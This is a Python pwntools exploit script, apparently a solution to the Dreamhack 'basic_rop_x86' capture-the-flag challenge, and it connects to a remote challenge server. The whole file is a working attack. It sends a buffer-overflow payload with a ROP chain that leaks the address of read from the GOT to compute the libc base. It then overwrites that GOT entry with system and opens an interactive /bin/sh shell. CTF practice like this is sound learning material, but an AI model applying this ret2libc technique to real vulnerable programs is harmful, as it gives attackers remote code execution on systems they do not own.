from pwn import *

context.log_level = 'info'
context.terminal = ['tmux', 'splitw', '-h']

p = remote('host3.dreamhack.games', 15610)
# p = process('./basic_rop_x86')
e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6')

r = ROP(e)

def slog(name, addr): return success(': '.join([name, hex(addr)]))

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']

pop_ret = r.find_gadget(['pop ebp', 'ret'])[0]
pop2_ret = r.find_gadget(['pop edi', 'pop ebp', 'ret'])[0]
pop3_ret = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]

# write(1, read_got, 4)
payload = b'A' * 0x48
payload += p32(write_plt)
payload += p32(pop3_ret)
payload += p32(1) + p32(read_got) + p32(4)

# read(0, read_got, 12)
payload += p32(read_plt)
payload += p32(pop3_ret)
payload += p32(0) + p32(read_got) + p32(12)

# read("/bin/sh") == system("/bin/sh")
payload += p32(read_plt)
payload += p32(pop_ret)
payload += p32(read_got + 4)

p.send(payload)
p.recvuntil(b'A' * 0x40)

# Calculate libc base address
read_addr = u32(p.recvn(4))
libc_base = read_addr - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']

slog('read addr', read_addr)
slog('libc base', libc_base)
slog('system addr', system_addr)

p.send(p32(system_addr) + b"/bin/sh\x00")

p.interactive()